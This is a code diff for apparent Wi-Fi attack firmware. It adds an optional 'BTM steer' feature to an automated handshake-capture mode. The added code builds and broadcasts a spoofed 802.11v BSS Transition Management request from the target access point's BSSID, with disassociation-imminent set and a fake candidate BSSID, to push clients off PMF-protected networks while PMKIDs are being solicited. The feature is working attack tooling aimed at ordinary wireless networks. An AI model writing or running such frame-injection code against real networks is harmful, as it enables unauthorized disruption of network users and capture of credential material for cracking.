@@ -20,6 +20,8 @@
 #include "ui/screen_manager.h"
 #include "utils/handshake_utils.h"
 #include "utils/handshake_save.h"
+#include "utils/btm_frame.h"
+#include "utils/btm_tx.h"
 #include "modules/storage/handshake_metadata.h"
 #include "modules/wifi/wifi_scanner.h"
 
@@ -456,6 +458,11 @@ void HandshakeScreen::handleConfigEdit(int delta) {
             autoStrategy_ = static_cast<AutoHuntStrategy>(next);
         } else if (configList_.selectedIndex() == 1) {
             autoDegradeOnPmf_ = !autoDegradeOnPmf_;
+        } else if (configList_.selectedIndex() == 2) {
+            // Row 2: BTM steer (slice-0155). Default off; honest-labelled "(unverified)"
+            // in drawConfig because a spoofed BTM Request is a robust management action
+            // that PMF should protect in theory, and no device evidence says otherwise yet.
+            autoBtmSteer_ = !autoBtmSteer_;
         }
         return;
     }
@@ -858,10 +865,53 @@ void HandshakeScreen::updateAutoHunt() {
             }
             break;
             
-        case AutoHuntState::ATTACKING:
+        case AutoHuntState::ATTACKING: {
             // Update capture - success is handled by onHandshakeCaptured callback
             capture_.update();
-            
+
+            // One-shot BTM steer (slice-0155). The pure predicate gates to the exact DoD
+            // cell: steer toggle on, target is PMF-required, effective strategy arms
+            // solicitation (BTM is meaningless without a PMKID path to hand off to), the
+            // first half of the attack window has elapsed, and we have not already fired
+            // for this target. The candidate BSSID is the target BSSID with the
+            // locally-administered bit flipped, so the field looks plausible without
+            // conflicting with any real upstream MAC.
+            const utils::BtmInjectInputs btmInputs{
+                /*pmfRequired=*/       latchedTargetPmfRequired_,
+                /*steerEnabled=*/      autoBtmSteer_,
+                /*alreadyInjected=*/   btmInjectedThisTarget_,
+                /*halfWindowElapsed=*/ elapsed >= AUTO_ATTACK_TIME / 2,
+                /*armsSolicitation=*/  utils::armsForStrategy(latchedEffective_.strategy).solicitPmkid,
+            };
+            if (utils::shouldInjectBtm(btmInputs)) {
+                uint8_t candidate[6];
+                memcpy(candidate, targetBssid_, 6);
+                candidate[0] |= 0x02;  // flip the LAA bit so the candidate reads as a locally-administered MAC
+                candidate[0] &= ~0x01; // clear multicast bit (BSSID must be unicast)
+
+                static constexpr uint8_t kBroadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                utils::BtmRequestParams p{};
+                p.targetBssid        = targetBssid_;
+                p.destMac            = kBroadcast;
+                p.candidateBssid     = candidate;
+                p.dialogToken        = 0x01;
+                p.requestMode        = static_cast<uint8_t>(utils::BtmRequestModeBit::PreferredCandidateListIncluded)
+                                     | static_cast<uint8_t>(utils::BtmRequestModeBit::DisassociationImminent);
+                p.disassocTimerTu    = 100;   // ~102 ms (TUs are 1024 us). A plausible nudge, not an age.
+                p.validityIntervalBi = 20;
+                p.candidateOpClass   = 81;    // 2.4 GHz global operating class
+                p.candidateChannel   = targetChannel_;
+                p.candidatePhyType   = 7;     // OFDM/ERP
+
+                btmInjectedThisTarget_ = true;  // latch BEFORE TX so a TX failure does not loop
+                const bool ok = utils::sendBtmRequest(p);
+                LOG_I("AUTOHUNT", "%s: BTM:injected (unverified, candidate=%02X:%02X:%02X:%02X:%02X:%02X ch=%u) tx=%s",
+                      targetSsid_,
+                      candidate[0], candidate[1], candidate[2], candidate[3], candidate[4], candidate[5],
+                      targetChannel_,
+                      ok ? "ok" : "fail");
+            }
+
             // Only handle timeout here - success triggers callback
             if (elapsed >= AUTO_ATTACK_TIME) {
                 // Timeout on this target, move to next
@@ -869,6 +919,7 @@ void HandshakeScreen::updateAutoHunt() {
                 setAutoHuntState(AutoHuntState::WAITING);
             }
             break;
+        }
             
         case AutoHuntState::WAITING:
             // Brief pause before next target
@@ -894,6 +945,9 @@ void HandshakeScreen::updateAutoHunt() {
             // the next target's "Mode:" line before LOCKING re-resolves (slice-0154).
             latchedEffective_ = {utils::EffectiveStrategy::Deauth, utils::PmfResolveReason::NONE};
             latchedTargetPmfRequired_ = false;
+            // Clear the per-target BTM one-shot latch so the next PMF-required target gets
+            // its own injection chance (slice-0155).
+            btmInjectedThisTarget_ = false;
             
             // Clear scan results and rescan
             WiFi.scanDelete();
@@ -1212,9 +1266,17 @@ void HandshakeScreen::drawConfig(Canvas& canvas) {
                     ui::ConfigRow::render(c, rowY, "Strategy:", strat);
                     return;
                 }
-                // Row 1: Degrade on PMF toggle (ADR-0153). Default on; when off and the
-                // intent is Deauth, PMF-required targets are skipped instead of degraded.
-                ui::ConfigRow::render(c, rowY, "Degrade on PMF:", autoDegradeOnPmf_ ? "On" : "Off");
+                if (idx == 1) {
+                    // Row 1: Degrade on PMF toggle (ADR-0153). Default on; when off and the
+                    // intent is Deauth, PMF-required targets are skipped instead of degraded.
+                    ui::ConfigRow::render(c, rowY, "Degrade on PMF:", autoDegradeOnPmf_ ? "On" : "Off");
+                    return;
+                }
+                // Row 2: BTM steer toggle (slice-0155). Default off. The "(unverified)" suffix
+                // is required by the DoD so the knob never claims a capability the device has
+                // not demonstrated: spoofed 802.11v BTM Request is a robust management action
+                // that PMF should protect in theory.
+                ui::ConfigRow::render(c, rowY, "BTM steer (unverified):", autoBtmSteer_ ? "On" : "Off");
             },
             !footerHints_.hasFocus());
         return;
